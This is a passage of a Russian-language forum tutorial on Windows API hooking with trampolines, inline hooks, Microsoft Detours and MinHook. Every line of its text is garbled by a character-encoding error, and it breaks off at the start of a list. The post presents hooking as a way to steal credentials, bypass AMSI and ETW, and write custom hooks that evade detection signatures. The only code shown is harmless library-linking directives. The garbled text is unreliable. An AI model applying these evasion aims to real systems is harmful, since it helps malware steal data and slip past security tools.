–¢—Ä–∞–º–ø–ª–∏–Ω ‚Äî —ç—Ç–æ —à–µ–ª–ª–∫–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è –ø—É—Ç–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞ –ø—É—Ç–µ–º –ø–µ—Ä–µ—Ö–æ–¥–∞ –Ω–∞ –¥—Ä—É–≥–æ–π –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π –∞–¥—Ä–µ—Å –≤ –∞–¥—Ä–µ—Å–Ω–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ –ø—Ä–æ—Ü–µ—Å—Å–∞. –®–µ–ª–ª–∫–æ–¥ —Ç—Ä–∞–º–ø–ª–∏–Ω–∞ –≤—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è –≤ –Ω–∞—á–∞–ª–æ —Ñ—É–Ω–∫—Ü–∏–∏, –≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ —á–µ–≥–æ —Ñ—É–Ω–∫—Ü–∏—è —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è &quot;–ø–æ–¥—Ü–µ–ø–ª–µ–Ω–Ω–æ–π&quot;. –ö–æ–≥–¥–∞ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è –ø–æ–¥—Ü–µ–ø–ª–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è, –≤–º–µ—Å—Ç–æ –Ω–µ–µ –∞–∫—Ç–∏–≤–∏—Ä—É–µ—Ç—Å—è —à–µ–ª–ª–∫–æ–¥ —Ç—Ä–∞–º–ø–ª–∏–Ω–∞, –∏ –ø–æ—Ç–æ–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –∏ –∏–∑–º–µ–Ω—è–µ—Ç—Å—è –Ω–∞ –¥—Ä—É–≥–æ–π –∞–¥—Ä–µ—Å, —á—Ç–æ –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—é –¥—Ä—É–≥–æ–π —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785174606.png"
		data-src="https://osint42.org/attachments/1746785174606-png.192/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785174606-png.192/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785174606.png"
			title="1746785174606.png"
			width="1058" height="385" loading="lazy" />
	</div><br />
<br />
<b>–í—Å—Ç—Ä–∞–∏–≤–∞–µ–º—ã–π –•—É–∫</b><br />
<br />
–í—Å—Ç—Ä–∞–∏–≤–∞–µ–º—ã–π —Ö—É–∫ ‚Äî —ç—Ç–æ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è API-—Ö—É–∫–æ–≤, –∫–æ—Ç–æ—Ä—ã–π —Ä–∞–±–æ—Ç–∞–µ—Ç –∞–Ω–∞–ª–æ–≥–∏—á–Ω–æ —Ö—É–∫—É –Ω–∞ –æ—Å–Ω–æ–≤–µ —Ç—Ä–∞–º–ø–ª–∏–Ω–∞. –†–∞–∑–Ω–∏—Ü–∞ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ –≤—Å—Ç—Ä–∞–∏–≤–∞–µ–º—ã–µ —Ö—É–∫–∏ –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∑–∞–∫–æ–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏, –ø–æ–∑–≤–æ–ª—è—è –Ω–æ—Ä–º–∞–ª—å–Ω–æ–º—É –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—é –ø—Ä–æ–¥–æ–ª–∂–∞—Ç—å—Å—è. –ù–µ—Å–º–æ—Ç—Ä—è –Ω–∞ —Ç–æ —á—Ç–æ –æ–Ω–∏ —Å–ª–æ–∂–Ω–µ–µ –≤ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –∏ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ —Ç—Ä—É–¥–Ω–µ–µ –≤ –æ–±—Å–ª—É–∂–∏–≤–∞–Ω–∏–∏, –≤—Å—Ç—Ä–∞–∏–≤–∞–µ–º—ã–µ —Ö—É–∫–∏ –±–æ–ª–µ–µ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785181159.png"
		data-src="https://osint42.org/attachments/1746785181159-png.193/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785181159-png.193/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785181159.png"
			title="1746785181159.png"
			width="1020" height="396" loading="lazy" />
	</div><br />
<br />
API-—Ö—É–∫ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –Ω–µ–∫–æ—Ç–æ—Ä—ã–º–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞–º–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, —á—Ç–æ–±—ã –ø–æ–∑–≤–æ–ª–∏—Ç—å –∏–º –±–æ–ª–µ–µ —Ç—â–∞—Ç–µ–ª—å–Ω–æ –∏–∑—É—á–∞—Ç—å —á–∞—Å—Ç–æ –∑–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª—è–µ–º—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏. –û–± —ç—Ç–æ–º –±—É–¥–µ—Ç –ø–æ–¥—Ä–æ–±–Ω–µ–µ —Ä–∞—Å—Å–∫–∞–∑–∞–Ω–æ –¥–∞–ª–µ–µ.<br />
<br />
<b>–ó–∞—á–µ–º API-–•—É–∫</b><br />
<br />
–•–æ—Ç—è API-—Ö—É–∫ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û –∏ —Ü–µ–ª–µ–π –æ—Ç–ª–∞–¥–∫–∏, –µ–≥–æ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø—Ä–∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û –ø–æ —Å–ª–µ–¥—É—é—â–∏–º –ø—Ä–∏—á–∏–Ω–∞–º:<br />
<br />
–°–±–æ—Ä –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –∏–ª–∏ –¥–∞–Ω–Ω—ã—Ö (–Ω–∞–ø—Ä–∏–º–µ—Ä, —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ).<br />
<br />
–ò–∑–º–µ–Ω–µ–Ω–∏–µ –∏–ª–∏ –ø–µ—Ä–µ—Ö–≤–∞—Ç –≤—ã–∑–æ–≤–æ–≤ —Ñ—É–Ω–∫—Ü–∏–π –≤ –∑–ª–æ–Ω–∞–º–µ—Ä–µ–Ω–Ω—ã—Ö —Ü–µ–ª—è—Ö.<br />
<br />
–û–±—Ö–æ–¥ –º–µ—Ä –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –ø—É—Ç–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –ø–æ–≤–µ–¥–µ–Ω–∏—è –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –ø—Ä–æ–≥—Ä–∞–º–º—ã (–Ω–∞–ø—Ä–∏–º–µ—Ä, AMSI, ETW).<br />
<br />
<b>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è –•—É–∫–∞</b><br />
<br />
–°—É—â–µ—Å—Ç–≤—É–µ—Ç –º–Ω–æ–≥–æ —Å–ø–æ—Å–æ–±–æ–≤ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ API-—Ö—É–∫–∞, –æ–¥–∏–Ω –∏–∑ —Å–ø–æ—Å–æ–±–æ–≤ ‚Äî —á–µ—Ä–µ–∑ –æ—Ç–∫—Ä—ã—Ç—ã–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏, —Ç–∞–∫–∏–µ –∫–∞–∫ –±–∏–±–ª–∏–æ—Ç–µ–∫–∞ <a href="https://github.com/microsoft/Detours" target="_blank" class="link link--external" rel="noopener">Detours –æ—Ç Microsoft</a> –∏ <a href="https://github.com/TsudaKageyu/minhook" target="_blank" class="link link--external" rel="noopener">Minhook</a>. –ï—â–µ –æ–¥–∏–Ω, –±–æ–ª–µ–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–π —Å–ø–æ—Å–æ–±, ‚Äî –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ API Windows, –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–Ω—ã—Ö –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è API-—Ö—É–∫–∞ (—Ö–æ—Ç—è —Å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–º–∏ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—è–º–∏).<br />
<br />
–î–∞–ª–µ–µ –≤ —Å—Ç–∞—Ç—å–µ –±—É–¥—É—Ç –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω—ã –∫–∞–∫ Detours, —Ç–∞–∫ –∏ Minhook.<br />
<br />
–ö—Ä–æ–º–µ —Ç–æ–≥–æ, –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã API Windows, —á—Ç–æ–±—ã —É–≤–∏–¥–µ—Ç—å, —á—Ç–æ –æ–Ω–∏ –º–æ–≥—É—Ç –ø—Ä–µ–¥–ª–æ–∂–∏—Ç—å.<br />
<br />
<b>–ù–∞–∫–æ–Ω–µ—Ü, –±—É–¥–µ—Ç —Å–æ–∑–¥–∞–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –∫–æ–¥ —Ö—É–∫–∞,</b> —á—Ç–æ–±—ã —É–º–µ–Ω—å—à–∏—Ç—å –ø–æ–¥–ø–∏—Å–∏ –∏ –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä—ã –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ –æ–±—ã—á–Ω–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –æ—Ç–∫—Ä—ã—Ç—ã—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫.<br />
<br />
–ò—Ç–∞–∫ –Ω–∞—á–Ω—ë–º.)<br />
<br />
API Hooking - <a href="https://github.com/microsoft/Detours" target="_blank" class="link link--external" rel="noopener">–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ Detours</a><br />
<br />
–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ Detours –¥–ª—è —Ö—É–∫–∞, —Ä–∞–∑—Ä–∞–±–æ—Ç–∞–Ω–Ω–∞—è Microsoft Research, –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞—Ç—å –∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—Ç—å –≤—ã–∑–æ–≤—ã —Ñ—É–Ω–∫—Ü–∏–π –≤ Windows.<br />
–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ—Ç –≤—ã–∑–æ–≤—ã –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π –∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–π –∑–∞–º–µ–Ω—è—é—â–µ–π —Ñ—É–Ω–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä–∞—è –º–æ–∂–µ—Ç –∑–∞—Ç–µ–º –≤—ã–ø–æ–ª–Ω—è—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∑–∞–¥–∞—á–∏ –∏–ª–∏ –∏–∑–º–µ–Ω—è—Ç—å –ø–æ–≤–µ–¥–µ–Ω–∏–µ –∏—Å—Ö–æ–¥–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏.<br />
Detours –æ–±—ã—á–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Å –ø—Ä–æ–≥—Ä–∞–º–º–∞–º–∏ –Ω–∞ C/C++ –∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞ –∫–∞–∫ —Å 32-–±–∏—Ç–Ω—ã–º–∏, —Ç–∞–∫ –∏ —Å 64-–±–∏—Ç–Ω—ã–º–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º–∏.<br />
<br />
–°—Ç—Ä–∞–Ω–∏—Ü–∞ wiki –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –¥–æ—Å—Ç—É–ø–Ω–∞ <a href="https://github.com/microsoft/Detours/wiki/" target="_blank" class="link link--external" rel="noopener">–∑–¥–µ—Å—å.</a><br />
<br />
<b>–¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏</b><br />
<br />
–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ Detours –∑–∞–º–µ–Ω—è–µ—Ç –ø–µ—Ä–≤—ã–µ –Ω–µ—Å–∫–æ–ª—å–∫–æ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π —Ü–µ–ª–µ–≤–æ–π —Ñ—É–Ω–∫—Ü–∏–∏, —Ç–æ –µ—Å—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏, –∫ –∫–æ—Ç–æ—Ä–æ–π –ø—Ä–∏–º–µ–Ω—è–µ—Ç—Å—è —Ö—É–∫, –±–µ–∑—É—Å–ª–æ–≤–Ω—ã–º –ø–µ—Ä–µ—Ö–æ–¥–æ–º –∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ö–æ–¥–Ω–æ–≥–æ –ø—É—Ç–∏, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –≤–º–µ—Å—Ç–æ –Ω–µ—ë.<br />
–¢–µ—Ä–º–∏–Ω &quot;–±–µ–∑—É—Å–ª–æ–≤–Ω—ã–π –ø–µ—Ä–µ—Ö–æ–¥&quot; —Ç–∞–∫–∂–µ –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è &quot;—Ç—Ä–∞–º–ø–ª–∏–Ω–æ–º&quot;.<br />
<br />
–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∏ —É–¥–∞–ª–µ–Ω–∏—è —Ö—É–∫–æ–≤ –∏–∑ —Ü–µ–ª–µ–≤–æ–π —Ñ—É–Ω–∫—Ü–∏–∏. –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –ø–æ–∑–≤–æ–ª—è—é—Ç –≥—Ä—É–ø–ø–∏—Ä–æ–≤–∞—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ñ—É–Ω–∫—Ü–∏–π —Ö—É–∫–æ–≤ –≤–º–µ—Å—Ç–µ –∏ –ø—Ä–∏–º–µ–Ω—è—Ç—å –∏—Ö –∫–∞–∫ –µ–¥–∏–Ω—É—é –µ–¥–∏–Ω–∏—Ü—É, —á—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–æ–ª–µ–∑–Ω–æ –ø—Ä–∏ –≤–Ω–µ—Å–µ–Ω–∏–∏ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –∏–∑–º–µ–Ω–µ–Ω–∏–π –≤ –ø–æ–≤–µ–¥–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã. –≠—Ç–æ —Ç–∞–∫–∂–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –ø—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–æ –≤ —Ç–æ–º, —á—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –º–æ–∂–µ—Ç –ª–µ–≥–∫–æ –æ—Ç–º–µ–Ω–∏—Ç—å –≤—Å–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è –ø—Ä–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏. –ü—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –º–æ–∂–Ω–æ –Ω–∞—á–∞—Ç—å –Ω–æ–≤—É—é —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é, –¥–æ–±–∞–≤–∏—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏ —Ö—É–∫–æ–≤ –∏ –∑–∞—Ç–µ–º –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –µ—ë. –ü—Ä–∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –≤—Å–µ —Ñ—É–Ω–∫—Ü–∏–∏ —Ö—É–∫–æ–≤, –¥–æ–±–∞–≤–ª–µ–Ω–Ω—ã–µ –∫ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏, –±—É–¥—É—Ç –ø—Ä–∏–º–µ–Ω–µ–Ω—ã –∫ –ø—Ä–æ–≥—Ä–∞–º–º–µ, –∫–∞–∫ —ç—Ç–æ –±—ã–ª–æ –±—ã –≤ —Å–ª—É—á–∞–µ —Å —É–¥–∞–ª–µ–Ω–∏–µ–º —Ö—É–∫–∞.<br />
<br />
<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ Detours</b><br />
<br />
–î–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–π –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ Detours –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∑–∞–≥—Ä—É–∑–∏—Ç—å –∏ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞—Ç—å —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π Detours, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–µ —Ñ–∞–π–ª—ã –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ (.lib). –ö—Ä–æ–º–µ —Ç–æ–≥–æ, —Å–ª–µ–¥—É–µ—Ç –≤–∫–ª—é—á–∏—Ç—å –∑–∞–≥–æ–ª–æ–≤–æ—á–Ω—ã–π —Ñ–∞–π–ª detours.h, —á—Ç–æ –æ–±—ä—è—Å–Ω—è–µ—Ç—Å—è –≤ —Ä–∞–∑–¥–µ–ª–µ &quot;–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ Detours&quot; –Ω–∞ –≤–∏–∫–∏ Detours.<br />
<br />
–î–ª—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–π –ø–æ–º–æ—â–∏ –≤ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ .lib —Ñ–∞–π–ª–æ–≤ –≤ –ø—Ä–æ–µ–∫—Ç –æ–∑–Ω–∞–∫–æ–º—å—Ç–µ—Å—å <a href="https://learn.microsoft.com/en-us/cpp/build/reference/dot-lib-files-as-linker-input?view=msvc-170" target="_blank" class="link link--external" rel="noopener">—Å –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–µ–π Microsoft.</a><br />
<br />
<b>32-–±–∏—Ç–Ω–∞—è vs 64-–±–∏—Ç–Ω–∞—è –±–∏–±–ª–∏–æ—Ç–µ–∫–∞ Detours</b><br />
<br />
–ü—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–π –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ –∫–æ–¥ —Å–æ–¥–µ—Ä–∂–∏—Ç –ø—Ä–µ–ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–Ω—ã–π –∫–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç, –∫–∞–∫—É—é –≤–µ—Ä—Å–∏—é —Ñ–∞–π–ª–∞ .lib Detours —Å–ª–µ–¥—É–µ—Ç –≤–∫–ª—é—á–∏—Ç—å, –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º–æ–π –º–∞—à–∏–Ω—ã. –î–ª—è —ç—Ç–æ–≥–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –º–∞–∫—Ä–æ—Å—ã _M_X64 –∏ _M_IX86. –≠—Ç–∏ –º–∞–∫—Ä–æ—Å—ã –æ–ø—Ä–µ–¥–µ–ª–µ–Ω—ã –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–æ–º –¥–ª—è —É–∫–∞–∑–∞–Ω–∏—è, —Ä–∞–±–æ—Ç–∞–µ—Ç –ª–∏ –º–∞—à–∏–Ω–∞ –Ω–∞ 64-–±–∏—Ç–Ω–æ–π –∏–ª–∏ 32-–±–∏—Ç–Ω–æ–π –≤–µ—Ä—Å–∏–∏ Windows. –ü—Ä–µ–ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–Ω—ã–π –∫–æ–¥ –≤—ã–≥–ª—è–¥–∏—Ç —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ï—Å–ª–∏ –∫–æ–º–ø–∏–ª–∏—Ä—É–µ—Ç—Å—è –∫–∞–∫ 64-–±–∏—Ç
#ifdef _M_X64
#pragma comment (lib, &quot;detoursx64.lib&quot;)
#endif // _M_X64
// –ï—Å–ª–∏ –∫–æ–º–ø–∏–ª–∏—Ä—É–µ—Ç—Å—è –∫–∞–∫ 32-–±–∏—Ç
#ifdef _M_IX86
#pragma comment (lib, &quot;detoursx86.lib&quot;)
#endif // _M_IX86</code></pre>
	</div>
</div><br />
#ifdef _M_X64 –ø—Ä–æ–≤–µ—Ä—è–µ—Ç, –æ–ø—Ä–µ–¥–µ–ª–µ–Ω –ª–∏ –º–∞–∫—Ä–æ—Å _M_X64, –∏ –µ—Å–ª–∏ –æ–Ω –æ–ø—Ä–µ–¥–µ–ª–µ–Ω, —Å–ª–µ–¥—É—é—â–∏–π –∑–∞ –Ω–∏–º –∫–æ–¥ –±—É–¥–µ—Ç –≤–∫–ª—é—á–µ–Ω –≤ –∫–æ–º–ø–∏–ª—è—Ü–∏—é. –ï—Å–ª–∏ –æ–Ω –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω, –∫–æ–¥ –±—É–¥–µ—Ç –ø—Ä–æ–∏–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞–Ω. –ê–Ω–∞–ª–æ–≥–∏—á–Ω–æ, #ifdef _M_IX86 –ø—Ä–æ–≤–µ—Ä—è–µ—Ç, –æ–ø—Ä–µ–¥–µ–ª–µ–Ω –ª–∏ –º–∞–∫—Ä–æ—Å _M_IX86, –∏ –µ—Å–ª–∏ –æ–Ω –æ–ø—Ä–µ–¥–µ–ª–µ–Ω, —Å–ª–µ–¥—É—é—â–∏–π –∑–∞ –Ω–∏–º –∫–æ–¥ –±—É–¥–µ—Ç –≤–∫–ª—é—á–µ–Ω –≤ –∫–æ–º–ø–∏–ª—è—Ü–∏—é. #pragma comment (lib, &quot;detoursx64.lib&quot;) –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Å–≤—è–∑—ã–≤–∞–Ω–∏—è –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ detoursx64.lib –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –¥–ª—è 64-–±–∏—Ç–Ω—ã—Ö —Å–∏—Å—Ç–µ–º, –∏ #pragma comment (lib, &quot;detoursx86.lib&quot;) –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Å–≤—è–∑—ã–≤–∞–Ω–∏—è –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ detoursx86.lib –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –¥–ª—è 32-–±–∏—Ç–Ω—ã—Ö —Å–∏—Å—Ç–µ–º.<br />
<br />
–§–∞–π–ª—ã detoursx64.lib –∏ detoursx86.lib —Å–æ–∑–¥–∞—é—Ç—Å—è –ø—Ä–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ Detours, detoursx64.lib —Å–æ–∑–¥–∞–µ—Ç—Å—è –ø—Ä–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ Detours –∫–∞–∫ 64-–±–∏—Ç–Ω—ã–π –ø—Ä–æ–µ–∫—Ç, —Ç–∞–∫–∏–º –∂–µ –æ–±—Ä–∞–∑–æ–º —Ñ–∞–π–ª detoursx86.lib —Å–æ–∑–¥–∞–µ—Ç—Å—è –ø—Ä–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ Detours –∫–∞–∫ 32-–±–∏—Ç–Ω—ã–π –ø—Ä–æ–µ–∫—Ç.<br />
<br />
<b>–§—É–Ω–∫—Ü–∏–∏ API Detours</b><br />
<br />
–ü—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ –ª—é–±–æ–≥–æ –º–µ—Ç–æ–¥–∞ —Ö—É–∫–æ–≤ –ø–µ—Ä–≤—ã–º —à–∞–≥–æ–º –≤—Å–µ–≥–¥–∞ —è–≤–ª—è–µ—Ç—Å—è –ø–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏ WinAPI –¥–ª—è —Ö—É–∫–∞. –ê–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏ —Ç—Ä–µ–±—É–µ—Ç—Å—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è, –≥–¥–µ –±—É–¥—É—Ç —Ä–∞–∑–º–µ—â–µ–Ω—ã –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –ø–µ—Ä–µ—Ö–æ–¥–∞. –í —ç—Ç–æ–º –º–æ–¥—É–ª–µ —Ñ—É–Ω–∫—Ü–∏—è MessageBoxA –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –∫–∞–∫ —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è —Ö—É–∫–∞.<br />
<br />
–ù–∏–∂–µ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω—ã —Ñ—É–Ω–∫—Ü–∏–∏ API, –∫–æ—Ç–æ—Ä—ã–µ –ø—Ä–µ–¥–ª–∞–≥–∞–µ—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫–∞ Detours:<br />
<ul>
